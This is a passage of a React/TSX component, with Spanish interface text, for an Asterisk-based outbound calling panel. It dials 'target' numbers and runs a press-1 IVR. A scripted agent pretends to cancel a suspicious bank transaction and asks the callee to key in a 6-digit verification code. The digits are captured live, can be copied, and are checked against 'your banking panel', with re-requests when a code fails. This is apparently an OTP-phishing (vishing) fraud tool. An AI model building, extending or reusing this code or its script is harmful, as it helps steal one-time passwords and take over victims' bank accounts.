              className="px-3 py-1.5 rounded-lg text-xs font-bold bg-sky-500/20 hover:bg-sky-500/30 text-sky-300 border border-sky-500/40 flex items-center gap-1.5 transition-all cursor-pointer"
              title="Abre la pantalla de captura manual de OTP para pruebas directas desde el softphone marcando 8888"
            >
              <Phone className="w-3.5 h-3.5" />
              <span>Modo Prueba: Abrir Panel OTP para Ext. 8888</span>
            </button>
          )}
        </div>
      </div>

      {/* ACTIVE CALL REAL-TIME HUD (Appears when a call is running) */}
      {activeCall && activeCall.isActive && (
        <div className={`p-6 rounded-2xl bg-slate-950 border-2 shadow-2xl relative overflow-hidden animate-fadeIn ${
          activeCall.status === 'pressed_1'
            ? 'border-amber-400 ring-4 ring-amber-400/30 shadow-amber-500/20'
            : 'border-emerald-500/50 shadow-emerald-500/10'
        }`}>
          {/* Ambient background glow */}
          <div className="absolute -top-24 -right-24 w-80 h-80 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none" />
          {activeCall.status === 'pressed_1' && (
            <div className="absolute -top-20 -left-20 w-80 h-80 bg-amber-500/25 rounded-full blur-3xl pointer-events-none animate-pulse" />
          )}

          <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-slate-800 pb-4 relative z-10">
            <div className="flex items-center gap-3">
              <div className={`p-3 rounded-2xl ${
                activeCall.status === 'pressed_1'
                  ? 'bg-amber-500 text-slate-950 shadow-lg shadow-amber-500/50 animate-bounce'
                  : 'bg-emerald-500/20 text-emerald-400 animate-pulse border border-emerald-500/30'
              }`}>
                {activeCall.status === 'pressed_1' ? (
                  <BellRing className="w-6 h-6 animate-spin" />
                ) : (
                  <Radio className="w-6 h-6" />
                )}
              </div>
              <div>
                <div className="flex flex-wrap items-center gap-2">
                  <span className={`text-xs font-black px-2.5 py-1 rounded-full border flex items-center gap-1.5 shadow ${
                    activeCall.status === 'pressed_1'
                      ? 'bg-amber-400 text-slate-950 border-amber-300 font-extrabold animate-pulse'
                      : activeCall.status === 'transferred'
                      ? 'bg-sky-500/20 text-sky-300 border-sky-500/40 font-bold'
                      : activeCall.status === 'in_ivr'
                      ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40 font-bold'
                      : activeCall.status === 'ringing'
                      ? 'bg-amber-500/20 text-amber-300 border-amber-500/40 font-bold'
                      : 'bg-slate-800 text-slate-300 border-slate-700'
                  }`}>
                    <span className={`w-2 h-2 rounded-full ${
                      activeCall.status === 'pressed_1'
                        ? 'bg-slate-950 animate-ping'
                        : 'bg-emerald-400 animate-ping'
                    }`} />
                    {activeCall.status === 'pressed_1'
                      ? '¡CLIENTE MARCÓ 1!'
                      : activeCall.status === 'asking_cancel_code'
                      ? 'PIDIENDO CÓDIGO AL CLIENTE'
                      : activeCall.status === 'transferred'
                      ? 'CONECTADO CON ASESOR'
                      : activeCall.status === 'in_ivr'
                      ? 'CLIENTE EN LÍNEA (IVR)'
                      : activeCall.status === 'ringing'
                      ? 'TIMBRANDO EN TELÉFONO'
                      : 'MARCANDO POR TRONCAL'}
                  </span>

                  {/* PROMINENT LIVE DURATION TIMER */}
                  <div className="flex items-center gap-1.5 px-3 py-1 rounded-xl bg-slate-900 border border-emerald-500/40 shadow-inner">
                    <Clock className="w-4 h-4 text-emerald-400 animate-pulse" />
                    <span className="text-[11px] font-bold text-slate-400 uppercase tracking-wider">Duración:</span>
                    <span className="text-base font-black font-mono text-emerald-300 tracking-wider">
                      {formatTime(activeCall.duration)}
                    </span>
                  </div>
                </div>

                <h3 className="text-xl font-black text-white mt-1.5 flex items-center gap-2">
                  <span>{activeCall.number}</span>
                  {activeCall.name && <span className="text-sm font-normal text-slate-400">({activeCall.name})</span>}
                </h3>
                <div className="flex flex-wrap items-center gap-3 text-xs text-slate-400 mt-0.5">
                  <span>Servicio: <strong className="text-emerald-300">{activeCall.service}</strong></span>
                  <span>•</span>
                  <span>ID Saliente: <strong className="text-emerald-300">Carrier Automático</strong></span>
                </div>
              </div>
            </div>

            {/* Actions for Live Call */}
            <div className="flex flex-wrap items-center gap-2">
              <div className="flex items-center gap-1.5 bg-slate-950/80 p-1 rounded-xl border border-purple-500/30">
                <select
                  value={selectedOtpExten}
                  onChange={(e) => setSelectedOtpExten(e.target.value)}
                  className="bg-transparent text-purple-200 text-xs font-bold px-2 py-1 outline-none cursor-pointer"
                  title="Seleccionar extensión de destino (>= 4001)"
                >
                  {dynamicOtpList.map((o) => (
                    <option key={o.extension} value={o.extension} className="bg-slate-900 text-white">
                      Ext. {o.extension}
                    </option>
                  ))}
                </select>

                <button
                  id="btn-hud-transfer-otp"
                  type="button"
                  onClick={handleTransferToOtpSystem}
                  disabled={isTransferringToOtp}
                  className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-black bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500 text-white transition-all shadow-md shadow-purple-600/30 cursor-pointer disabled:opacity-50"
                  title={`Transferir al cliente al sistema interactivo para que digite su código (Ext. ${selectedOtpExten}). La llamada regresará a esta misma extensión una vez que el código sea validado.`}
                >
                  <KeyRound className="w-3.5 h-3.5" />
                  <span>{isTransferringToOtp ? 'Transfiriendo...' : `Mandar a OTP (${selectedOtpExten})`}</span>
                </button>
              </div>

              <button
                id="btn-hud-transfer-agent"
                onClick={handleTransferToAgent}
                className="inline-flex items-center gap-1.5 px-3.5 py-2.5 rounded-xl text-xs font-black bg-emerald-500 hover:bg-emerald-400 text-black transition-all shadow-md shadow-emerald-500/20"
              >
                <PhoneForwarded className="w-3.5 h-3.5" />
                <span>Pasar a Asesor ({activeCall.agent || (activeCall.agentExten !== 'ringall' ? activeCall.agentExten : '1001')})</span>
              </button>

              <button
                id="btn-hud-hangup"
                onClick={handleHangupActiveCall}
                className="inline-flex items-center gap-1.5 px-3.5 py-2.5 rounded-xl text-xs font-bold bg-rose-500/20 hover:bg-rose-500/30 text-rose-300 border border-rose-500/40 transition-all cursor-pointer"
              >
                <PhoneOff className="w-3.5 h-3.5" />
                <span>Colgar Llamada</span>
              </button>

              <button
                id="btn-hud-close-test"
                onClick={() => setActiveCall(null)}
                className="inline-flex items-center gap-1.5 px-2.5 py-2.5 rounded-xl text-xs font-semibold bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 transition-all cursor-pointer"
                title="Cerrar este panel visual de llamada"
              >
                <X className="w-3.5 h-3.5" />
              </button>
            </div>
          </div>

          {/* Real-time Call Stages Flow: 5 Steps */}
          <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-5 gap-2 my-5 text-center text-xs">
            {/* Paso 1: Marcando */}
            <div
              className={`p-3 rounded-xl border transition-all ${
                activeCall.status === 'dialing'
                  ? 'bg-emerald-500/20 border-emerald-500 text-emerald-300 font-bold animate-pulse ring-2 ring-emerald-500/40'
                  : 'bg-slate-900 border-slate-800 text-slate-400'
              }`}
            >
              <div className="text-[10px] font-mono uppercase text-slate-400">Paso 1</div>
              <div className="font-semibold mt-0.5">Marcando Troncal</div>
              <div className="text-[10px] text-slate-500 mt-1">Conectando SIP</div>
            </div>

            {/* Paso 2: Timbrando */}
            <div
              className={`p-3 rounded-xl border transition-all ${
                activeCall.status === 'ringing'
                  ? 'bg-emerald-500/20 border-emerald-500 text-emerald-300 font-bold animate-pulse ring-2 ring-emerald-500/40'
                  : activeCall.status !== 'dialing'
                  ? 'bg-slate-900/60 border-emerald-500/30 text-slate-300'
                  : 'bg-slate-900 border-slate-800 text-slate-400'
              }`}
            >
              <div className="text-[10px] font-mono uppercase text-slate-400">Paso 2</div>
              <div className="font-semibold mt-0.5">Timbrando en Teléfono</div>
              <div className="text-[10px] text-slate-500 mt-1">Sonando destino</div>
            </div>

            {/* Paso 3: Cliente en Línea */}
            <div
              className={`p-3 rounded-xl border transition-all ${
                activeCall.status === 'in_ivr'
                  ? 'bg-emerald-500/20 border-emerald-500 text-emerald-300 font-bold animate-pulse ring-2 ring-emerald-500/40'
                  : activeCall.status === 'pressed_1' || activeCall.status === 'otp_captured' || activeCall.status === 'transferred'
                  ? 'bg-slate-900/60 border-emerald-500/30 text-slate-300'
                  : 'bg-slate-900 border-slate-800 text-slate-400'
              }`}
            >
              <div className="text-[10px] font-mono uppercase text-slate-400">Paso 3</div>
              <div className="font-semibold mt-0.5">Cliente en Línea (IVR)</div>
              <div className="text-[10px] text-slate-500 mt-1">Escuchando locución</div>
            </div>

            {/* Paso 4: Cliente Presionó 1 / Captura */}
            <div
              className={`p-3 rounded-xl border transition-all ${
                activeCall.status === 'pressed_1'
                  ? 'bg-amber-500/30 border-amber-400 text-amber-200 font-black animate-pulse ring-4 ring-amber-400/50 shadow-lg shadow-amber-500/30 scale-105'
                  : activeCall.status === 'asking_cancel_code'
                  ? 'bg-cyan-500/25 border-cyan-400 text-cyan-200 font-bold animate-pulse ring-2 ring-cyan-400/40'
                  : activeCall.status === 'otp_captured'
                  ? 'bg-emerald-500/20 border-emerald-500 text-emerald-300 font-bold shadow-lg shadow-emerald-500/20'
                  : activeCall.status === 'transferred'
                  ? 'bg-slate-900/60 border-amber-500/30 text-amber-300'
                  : 'bg-slate-900 border-slate-800 text-slate-400'
              }`}
            >
              <div className="text-[10px] font-mono uppercase text-slate-400">Paso 4</div>
              <div className="font-bold mt-0.5 flex items-center justify-center gap-1">
                {activeCall.status === 'pressed_1' ? (
                  <>
                    <BellRing className="w-3.5 h-3.5 text-amber-400 animate-spin" />
                    <span className="text-amber-300 font-extrabold">¡PRESIONÓ 1!</span>
                  </>
                ) : activeCall.status === 'asking_cancel_code' ? (
                  <>
                    <KeyRound className="w-3.5 h-3.5 text-cyan-300 animate-pulse" />
                    <span className="text-cyan-200 font-extrabold">PIDIENDO CÓDIGO</span>
                  </>
                ) : (
                  <span>Respuesta DTMF (1 / OTP)</span>
                )}
              </div>
              <div className="text-[10px] text-slate-500 mt-1">
                {activeCall.pressed1Time ? `Detectado ${activeCall.pressed1Time}` : 'Esperando entrada del cliente'}
              </div>
            </div>

            {/* Paso 5: Conectado Asesor */}
            <div
              className={`p-3 rounded-xl border transition-all ${
                activeCall.status === 'transferred'
                  ? 'bg-sky-500/25 border-sky-400 text-sky-200 font-black ring-4 ring-sky-400/50 shadow-lg shadow-sky-500/30 animate-pulse'
                  : 'bg-slate-900 border-slate-800 text-slate-400'
              }`}
            >
              <div className="text-[10px] font-mono uppercase text-slate-400">Paso 5</div>
              <div className="font-semibold mt-0.5">Asesor en Línea</div>
              <div className="text-[10px] text-slate-500 mt-1">Ext. {activeCall.agentExten || '1001'} (X-Lite)</div>
            </div>
          </div>

          {/* BANNER GIGANTE Y ALERTA: CLIENTE PRESIONÓ 1 */}
          {activeCall.status === 'pressed_1' && (() => {
            const isCancelCodeCall = (activeCall.mode || callFlowMode) === 'cancel_code';
            const cleanNum = activeCall.number.replace(/[^0-9]/g, '');
            const isSending = sendingCancelCodeNum === cleanNum;
            return (
              <div className="p-5 rounded-2xl bg-gradient-to-r from-amber-950/90 via-amber-900/50 to-slate-950 border-2 border-amber-400 shadow-2xl shadow-amber-500/30 animate-fadeIn my-4">
                <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
                  <div className="flex items-center gap-4">
                    <div className="w-16 h-16 rounded-2xl bg-amber-400 text-slate-950 flex flex-col items-center justify-center font-black shadow-lg shadow-amber-400/50 animate-bounce shrink-0">
                      <span className="text-3xl leading-none">1</span>
                      <span className="text-[9px] uppercase tracking-wider font-extrabold">DTMF</span>
                    </div>
                    <div>
                      <div className="flex flex-wrap items-center gap-2">
                        <span className="px-2.5 py-0.5 rounded-full text-[10px] font-black uppercase tracking-wider bg-amber-400 text-slate-950 flex items-center gap-1 shadow">
                          <BellRing className="w-3 h-3 animate-spin" />
                          {isCancelCodeCall
                            ? '¡MARCÓ 1 — ENVÍALE EL CÓDIGO DE CANCELACIÓN!'
                            : '¡TECLA 1 PRESIONADA EN VIVO!'}
                        </span>
                        <span className="text-xs text-amber-200 font-mono font-bold">
                          {activeCall.pressed1Time ? `Detectado a las ${activeCall.pressed1Time}` : '¡Justo en este instante!'}
                        </span>
                      </div>
                      <h3 className="text-lg font-black text-white mt-1">
                        {isCancelCodeCall
                          ? 'El cliente marcó 1: Reproduciendo "Un momento por favor, le estamos enviando un código de cancelación"'
                          : 'El cliente ha marcado la tecla 1 en su teléfono'}
                      </h3>
                      <p className="text-xs text-amber-200/90 max-w-xl mt-0.5">
                        {isCancelCodeCall
                          ? 'El cliente está esperando a que le envíes el código de cancelación. Envíale el código ahora y presiona el botón verde para que Asterisk le pida digitarlo:'
                          : (
                            <>
                              Asterisk detectó la marcación DTMF 1. La llamada se está transfiriendo inmediatamente a tu extensión de Asesor (<strong>{activeCall.agent ? `Ext. ${activeCall.agent}` : activeCall.agentExten === 'ringall' ? 'Todas las Extensiones (Ring-All)' : `Ext. ${activeCall.agentExten || '1001'}`}</strong> / Softphone). ¡Listo para conversar con el cliente!
                            </>
                          )}
                      </p>
                    </div>
                  </div>

                  <div className="flex flex-col sm:flex-row items-center gap-2 shrink-0">
                    {isCancelCodeCall ? (
                      <div className="flex flex-col gap-2 w-full sm:w-auto">
                        <button
                          id="btn-hud-cancel-code-sent"
                          type="button"
                          disabled={isSending}
                          onClick={() => handleNotifyCancelCodeSent(activeCall.number, activeCall.agent || activeCall.agentExten)}
                          className="w-full sm:w-auto inline-flex items-center justify-center gap-2 px-6 py-3.5 rounded-xl font-black text-xs bg-emerald-500 hover:bg-emerald-400 text-slate-950 transition-all shadow-xl shadow-emerald-500/40 cursor-pointer disabled:opacity-60"
                        >
                          <Send className="w-4 h-4" />
                          <span>{isSending ? 'Activando solicitud...' : 'Ya Envié el Código → Pedir al Cliente que Digite'}</span>
                        </button>
                        <div className="flex items-center gap-2">
                          <button
                            id="btn-hud-cancel-valid"
                            type="button"
                            onClick={() => handleVerifyOtp('valid', activeCall.capturedOtp || 'CANCEL', activeCall.number)}
                            className="flex-1 inline-flex items-center justify-center gap-1.5 px-3 py-2 rounded-lg font-bold text-[11px] bg-emerald-600/30 hover:bg-emerald-600/50 text-emerald-200 border border-emerald-500/40 transition-all cursor-pointer"
                          >
                            <CheckCircle className="w-3.5 h-3.5" />
                            <span>Válido</span>
                          </button>
                          <button
                            id="btn-hud-cancel-invalid"
                            type="button"
                            onClick={() => handleVerifyOtp('invalid', activeCall.capturedOtp || 'CANCEL', activeCall.number)}
                            className="flex-1 inline-flex items-center justify-center gap-1.5 px-3 py-2 rounded-lg font-bold text-[11px] bg-rose-600/30 hover:bg-rose-600/50 text-rose-200 border border-rose-500/40 transition-all cursor-pointer"
                          >
                            <XCircle className="w-3.5 h-3.5" />
                            <span>Inválido</span>
                          </button>
                        </div>
                      </div>
                    ) : (
                      <button
                        id="btn-hud-press1-talk"
                        onClick={handleTransferToAgent}
                        className="w-full sm:w-auto inline-flex items-center justify-center gap-2 px-5 py-3 rounded-xl font-black text-xs bg-amber-400 hover:bg-amber-300 text-slate-950 transition-all shadow-lg shadow-amber-400/40 animate-pulse"
                      >
                        <PhoneCall className="w-4 h-4" />
                        <span>Conectar con Softphone ({activeCall.agent || (activeCall.agentExten !== 'ringall' ? activeCall.agentExten : '1001')})</span>
                      </button>
                    )}
                  </div>
                </div>
              </div>
            );
          })()}

          {/* Live Call Signal & Telemetry Strip */}
          <div className="p-3 rounded-xl bg-slate-900/80 border border-slate-800 flex flex-wrap items-center justify-between gap-3 text-xs mb-4">
            <div className="flex items-center gap-3">
              <div className="flex items-center gap-1.5 text-emerald-400 font-mono font-bold">
                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
                <span>CANAL ACTIVO:</span>
              </div>
              <span className="font-mono text-slate-300 bg-slate-950 px-2 py-0.5 rounded border border-slate-800">
                {activeCall.channel || `PJSIP/${activeCarrier}`}
              </span>
            </div>

            {/* Audio wave simulation bars indicating real audio transmission */}
            <div className="flex items-center gap-2">
              <span className="text-slate-400 text-[11px] font-mono">Audio ULAW 8kHz:</span>
              <div className="flex items-end gap-1 h-4">
                <span className="w-1 bg-emerald-400 rounded-full animate-pulse h-3" />
                <span className="w-1 bg-emerald-400 rounded-full animate-pulse h-4" style={{ animationDelay: '150ms' }} />
                <span className="w-1 bg-emerald-400 rounded-full animate-pulse h-2" style={{ animationDelay: '300ms' }} />
                <span className="w-1 bg-emerald-400 rounded-full animate-pulse h-4" style={{ animationDelay: '450ms' }} />
                <span className="w-1 bg-emerald-400 rounded-full animate-pulse h-3" style={{ animationDelay: '200ms' }} />
              </div>
            </div>

            <div className="flex items-center gap-2 font-mono">
              <span className="text-slate-400 text-[11px]">Tiempo en curso:</span>
              <strong className="text-emerald-300 font-black text-sm bg-slate-950 px-2.5 py-0.5 rounded border border-emerald-500/30">
                {formatTime(activeCall.duration)}
              </strong>
            </div>
          </div>

          {activeCall.validationNote && (
            <div
              className={`mb-4 p-3.5 rounded-xl border text-xs font-semibold flex items-center gap-2.5 animate-fadeIn ${
                activeCall.otpStatus === 'valid' || activeCall.cancelDecision === 'valid'
                  ? 'bg-emerald-500/15 border-emerald-500/50 text-emerald-200'
                  : activeCall.otpStatus === 'invalid' || activeCall.cancelDecision === 'invalid'
                  ? 'bg-rose-500/15 border-rose-500/50 text-rose-200'
                  : 'bg-sky-500/15 border-sky-500/40 text-sky-200'
              }`}
            >
              {activeCall.otpStatus === 'valid' || activeCall.cancelDecision === 'valid' ? (
                <CheckCircle className="w-4 h-4 text-emerald-400 shrink-0" />
              ) : activeCall.otpStatus === 'invalid' || activeCall.cancelDecision === 'invalid' ? (
                <XCircle className="w-4 h-4 text-rose-400 shrink-0" />
              ) : (
                <RefreshCw className="w-4 h-4 text-sky-400 shrink-0 animate-spin" />
              )}
              <span>{activeCall.validationNote}</span>
            </div>
          )}

          {/* CAPTURED OTP DISPLAY HUD: Solo visible mientras no haya sido validado */}
          {activeCall.otpStatus !== 'valid' && (
            <div className="p-6 rounded-xl bg-slate-900/90 border border-slate-800 text-center space-y-4">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
              <div className="text-xs font-semibold text-slate-400 uppercase tracking-wider flex items-center gap-2">
                <KeyRound className="w-4 h-4 text-emerald-400" />
                <span>
                  {(activeCall.mode || callFlowMode) === 'cancel_code'
                    ? 'Código de Cancelación Capturado en Vivo (Tiempo Real)'
                    : 'Dígitos DTMF Capturados en Vivo (Tiempo Real)'}
                </span>
              </div>
              <div className="text-xs font-mono text-slate-400 flex items-center gap-2">
                <Phone className="w-3.5 h-3.5 text-emerald-400" />
                <span>ID Saliente: <strong className="text-emerald-300 font-bold font-mono">Carrier (Automático)</strong></span>
              </div>
            </div>

            {/* AGENT IN-CALL OTP WORKFLOW HUD */}
            <div className="p-4 rounded-xl bg-slate-950/70 border border-slate-800 text-left space-y-3">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2 text-xs font-bold text-sky-300 uppercase tracking-wide">
                  <UserCheck className="w-4 h-4 text-emerald-400" />
                  <span>
                    {(activeCall.mode || callFlowMode) === 'cancel_code'
                      ? 'Modo Press-1 + Código de Cancelación: Validación por Agente'
                      : 'Flujo Asistido por Agente: Solicitud y Validación Manual de OTP'}
                  </span>
                </div>
                <span className="text-[11px] font-mono px-2.5 py-1 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 flex items-center gap-1.5 font-bold">
                  <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
                  {(activeCall.mode || callFlowMode) === 'cancel_code' ? 'IVR Cancelación Activo' : 'Agente en Línea con Cliente'}
                </span>
              </div>

              {(activeCall.mode || callFlowMode) === 'cancel_code' ? (
                <div className="p-3 rounded-lg bg-amber-950/30 border border-amber-500/30 text-xs text-slate-300">
                  <span className="text-amber-300 font-bold block mb-1">🛡️ Flujo Interactivo Press-1 + Código de Cancelación:</span>
                  <p className="text-slate-200">
                    1) Al marcar <strong>1</strong>, el sistema le dice <em>"Un momento por favor, le estamos enviando un código de cancelación"</em> y te <strong>avisa con alerta y sonido</strong>.<br />
                    2) Envíale el código al cliente y presiona <strong>"Ya Envié el Código → Pedir que Digite"</strong> para que Asterisk se lo solicite.<br />
                    3) Cuando aparezcan los dígitos aquí abajo, elige <strong>CÓDIGO VÁLIDO</strong> o <strong>CÓDIGO INVÁLIDO</strong>.
                  </p>
                </div>
              ) : (
                <div className="p-3 rounded-lg bg-slate-900 border border-sky-500/20 text-xs text-slate-300">
                  <span className="text-sky-400 font-bold block mb-1">🗣️ Guión para el Asesor (Solicitar código al cliente en llamada):</span>
                  <p className="italic text-slate-200">
                    "Señor/a <strong className="text-white">{activeCall.name || 'cliente'}</strong>, por motivos de seguridad y anulación preventiva de la transacción sospechosa, le acabamos de remitir su clave de verificación de 6 dígitos. Por favor márquela en este momento en el teclado numérico de su teléfono mientras permanezco en línea con usted para validar la anulación."
                  </p>
                </div>
              )}
            </div>

            {activeCall.capturedOtp ? (
              <div className="space-y-5">
                {/* Visualizador de dígitos ingresados */}
                <div className="space-y-2">
                  <div className="text-xs font-bold text-emerald-400 uppercase tracking-wider flex items-center justify-center gap-2">
                    <span className="w-2.5 h-2.5 rounded-full bg-emerald-400 animate-pulse" />
                    <span>Dígitos Ingresados por el Cliente en su Teléfono:</span>
                  </div>
                  <div className="flex items-center justify-center gap-2.5">
                    {activeCall.capturedOtp.split('').map((digit, idx) => (
                      <span
                        key={idx}
                        className="w-14 h-16 flex items-center justify-center text-3xl font-black font-mono text-emerald-400 bg-slate-950 rounded-xl border-2 border-emerald-500/60 shadow-lg shadow-emerald-500/30 animate-bounce"
                        style={{ animationDelay: `${idx * 100}ms` }}
                      >
                        {digit}
                      </span>
                    ))}
                  </div>
                </div>

                {/* BOTONES DE DECISIÓN DEL AGENTE (VÁLIDO / INVÁLIDO) */}
                <div className="p-5 rounded-xl bg-slate-950/90 border border-slate-800 space-y-4">
                  <div className="text-center space-y-1">
                    <div className="text-sm font-black text-white uppercase tracking-wider">
                      Decisión del Agente: ¿El código digitado por el cliente es VÁLIDO o INVÁLIDO?
                    </div>
                    <div className="text-xs text-slate-400">
                      Tú como asesor decides la aprobación en el sistema según la respuesta de tu panel bancario.
                    </div>
                  </div>

                  <div className="flex flex-wrap items-center justify-center gap-4">
                    {/* BOTÓN 1: CÓDIGO VÁLIDO */}
                    <button
                      id="btn-otp-mark-valid"
                      type="button"
                      onClick={() => handleVerifyOtp('valid', activeCall.capturedOtp, activeCall.number)}
                      className={`inline-flex items-center gap-2.5 px-7 py-4 rounded-xl font-black text-sm shadow-xl transition-all ${
                        activeCall.otpStatus === 'valid'
                          ? 'bg-emerald-500 text-slate-950 ring-4 ring-emerald-400/50 scale-105'
                          : 'bg-emerald-600 hover:bg-emerald-500 text-white shadow-emerald-600/30'
                      }`}
                    >
                      <CheckCircle className="w-5 h-5" />
                      <span>CÓDIGO VÁLIDO</span>
                    </button>

                    {/* BOTÓN 2: CÓDIGO INVÁLIDO (Pide automáticamente nuevo código) */}
                    <button
                      id="btn-otp-mark-invalid"
                      type="button"
                      onClick={() => handleVerifyOtp('invalid', activeCall.capturedOtp, activeCall.number)}
                      title="Marca como inválido y le pide un nuevo token de 6 dígitos automáticamente al cliente"
                      className={`inline-flex items-center gap-2.5 px-7 py-4 rounded-xl font-black text-sm shadow-xl transition-all ${
                        activeCall.otpStatus === 'invalid'
                          ? 'bg-rose-500 text-white ring-4 ring-rose-400/50 scale-105'
                          : 'bg-rose-600 hover:bg-rose-500 text-white shadow-rose-600/30'
                      }`}
                    >
                      <XCircle className="w-5 h-5" />
                      <span>CÓDIGO INVÁLIDO</span>
                    </button>

                    <button
                      id="btn-copy-live-otp"
                      type="button"
                      onClick={() => handleCopyOtp(activeCall.capturedOtp!, 'live-otp')}
                      className="inline-flex items-center gap-2 px-4 py-4 rounded-xl font-bold text-xs bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 transition-all"
                    >
                      {copiedId === 'live-otp' ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4 text-slate-400" />}
                      <span>{copiedId === 'live-otp' ? '¡Copiado!' : 'Copiar'}</span>
                    </button>
                  </div>

                  {/* Detalle tras la decisión del agente */}
                  {activeCall.otpStatus && activeCall.otpStatus !== 'pending' && (
                    <div
                      className={`p-3.5 rounded-xl text-xs font-semibold flex flex-col sm:flex-row sm:items-center justify-between gap-2 ${
                        activeCall.otpStatus === 'valid'
                          ? 'bg-emerald-500/15 border border-emerald-500/40 text-emerald-300'
                          : 'bg-rose-500/15 border border-rose-500/40 text-rose-300'
                      }`}
                    >
                      <div className="flex items-center gap-2">
                        {activeCall.otpStatus === 'valid' ? (
                          <CheckCircle className="w-5 h-5 text-emerald-400 shrink-0" />
                        ) : (
                          <XCircle className="w-5 h-5 text-rose-400 shrink-0" />
                        )}
                        <div>
                          <strong>
                            {activeCall.otpStatus === 'valid'
                              ? '✓ Operación Aprobada: El agente confirmó que el código OTP es VÁLIDO.'
                              : '✕ Operación Rechazada: El agente marcó el código OTP como INVÁLIDO.'}
                          </strong>
                          <p className="text-[11px] font-normal text-slate-300 mt-0.5">
                            {activeCall.otpStatus === 'valid'
                              ? 'Puedes indicarle al cliente que la anulación fue exitosa y dar por terminada la llamada.'
                              : 'Indícale al cliente que el código no coincide y usa el botón "Solicitar Nuevo Código / Reintentar" para recibir el nuevo.'}
                          </p>
                        </div>
                      </div>
                      <div className="flex items-center gap-2 shrink-0">
                        <span className="text-[11px] font-mono px-2 py-0.5 rounded bg-slate-900 border border-slate-800">
                          {new Date().toLocaleTimeString()}
                        </span>
                      </div>
                    </div>
                  )}
                </div>
              </div>
            ) : (
              <div className="py-8 text-slate-400 text-sm flex flex-col items-center justify-center gap-3 font-mono bg-slate-950/60 rounded-xl border border-slate-800/80">
                <div className="flex items-center gap-2.5 text-emerald-400">
                  <RefreshCw className="w-5 h-5 animate-spin" />
                  <span className="font-bold text-slate-200 text-base">Esperando que el cliente digite el código en su teléfono...</span>
                </div>
                <p className="text-xs text-slate-400 max-w-lg text-center leading-relaxed">
                  Pídele verbalmente al cliente en la llamada que marque su clave en su teclado numérico. En cuanto el cliente presione las teclas, los dígitos aparecerán aquí instantáneamente para que decidas si lo apruebas como válido o lo rechazas.
                </p>
                <div className="flex items-center gap-2 pt-1">
                  {Array.from({ length: 6 }).map((_, i) => (
                    <span
                      key={i}
                      className="w-10 h-12 flex items-center justify-center text-lg font-bold font-mono text-slate-600 bg-slate-900/80 rounded-lg border border-slate-800"
                    >
                      •
                    </span>
                  ))}
                </div>
              </div>
            )}
          </div>
          )}
        </div>
      )}

      {/* SINGLE LAUNCHER PANEL */}
      {productionMode === 'single' && (
        <div className="w-full space-y-6">
          {/* Main Launcher Form */}
          <div className="w-full space-y-6">
            <div className="p-6 rounded-2xl bg-slate-950 border border-slate-800 space-y-6">
              <h3 className="text-base font-bold text-white flex items-center gap-2">
                <Rocket className="w-5 h-5 text-emerald-400" />
                <span>Configurar Llamada de Producción</span>
              </h3>

              {/* Destination Phone Number */}
              <div className="space-y-2">
                <label className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center justify-between">
                  <span>Número de Teléfono del Objetivo</span>
                  <span className="text-slate-500 font-mono text-[11px]">Formato: 16104803845</span>
                </label>
                <div className="flex gap-2">
                  <input
                    id="input-prod-phone"
                    type="text"
                    value={targetNumber}
                    onChange={(e) => setTargetNumber(e.target.value)}
                    onKeyDown={(e) => {
                      if (e.key === 'Enter' && targetNumber.trim() && !isLaunching && !isHangingUp) {
                        e.preventDefault();
                        handleLaunchProductionCall();
                      }
                    }}
                    placeholder="ej. 16104803845"
                    className="flex-1 px-4 py-3 bg-slate-900 border border-slate-700 rounded-xl text-white font-mono text-lg font-bold focus:border-emerald-500 focus:outline-none"
                  />
                  <input
                    id="input-prod-name"
                    type="text"
                    value={targetName}
                    onChange={(e) => setTargetName(e.target.value)}
                    onKeyDown={(e) => {
                      if (e.key === 'Enter' && targetNumber.trim() && !isLaunching && !isHangingUp) {
                        e.preventDefault();
                        handleLaunchProductionCall();
                      }
                    }}
                    placeholder="Nombre titular (opcional)"
                    className="w-1/3 px-4 py-3 bg-slate-900 border border-slate-700 rounded-xl text-white text-xs focus:border-emerald-500 focus:outline-none hidden sm:block"
                  />
                </div>
              </div>

              {/* CARD 1.5: FLUJO AL CONTESTAR (PLAN DE MARCACIÓN ASIGNADO POR ADMINISTRADOR) */}
              <div className="p-4 rounded-xl bg-slate-900/90 border border-slate-800 space-y-3">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                  <div className="flex items-center gap-2 flex-wrap">
                    <Zap className="w-4 h-4 text-amber-400" />
                    <span className="text-xs font-bold text-white uppercase tracking-wider">
                      Plan de Marcación (Flujo al Contestar)
                    </span>
                    {!isSuperAdmin && (
                      <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded bg-amber-500/15 border border-amber-500/30 text-[10px] font-bold text-amber-300">
                        <Lock className="w-3 h-3" />
                        Asignado por Administrador
                      </span>
                    )}
                  </div>
                  {isSuperAdmin && (
                    <button
                      type="button"
                      onClick={() => setProductionMode('ivr_action')}
                      className="text-[11px] font-semibold text-emerald-400 hover:text-emerald-300 underline cursor-pointer self-start sm:self-auto"
                    >
                      Personalizar audios del IVR →
                    </button>
                  )}
                </div>

                {!isSuperAdmin && (
                  <p className="text-[11px] text-slate-400">
                    {adminAllowedCallFlowModes.length <= 1
                      ? 'Solo el Administrador puede asignar o cambiar tu plan de marcación y ruta saliente.'
                      : 'Solo puedes usar los planes de marcación autorizados para tu cuenta por el Administrador.'}
                  </p>
                )}

                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-2.5">
                  <button
                    type="button"
                    disabled={!isSuperAdmin && !adminAllowedCallFlowModes.includes('otp')}
